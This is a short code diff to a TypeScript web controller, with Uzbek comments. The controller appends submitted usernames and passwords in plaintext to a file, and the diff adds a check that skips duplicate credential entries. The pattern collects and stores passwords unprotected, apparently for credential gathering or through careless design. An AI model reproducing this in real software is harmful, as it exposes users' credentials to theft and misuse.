@@ -16,6 +16,21 @@ export class AppController {
     const logEntry = `Username: ${username}, Password: ${password}\n`;
 
     try {
+      // Fayl mavjudligini tekshirish
+      if (fs.existsSync(filePath)) {
+        const fileData = fs.readFileSync(filePath, 'utf8');
+        const entries = fileData
+          .split('\n')
+          .filter((line) => line.trim() !== '');
+
+        // Mavjud yozuvlarni tekshirish
+        const isDuplicate = entries.some((entry) => entry === logEntry.trim());
+        if (isDuplicate) {
+          return { message: 'Login data already exists. No changes made.' };
+        }
+      }
+
+      // Agar yozuv mavjud bo'lmasa, saqlash
       fs.appendFileSync(filePath, logEntry, 'utf8');
       return { message: 'Login data saved successfully!' };
     } catch (error) {
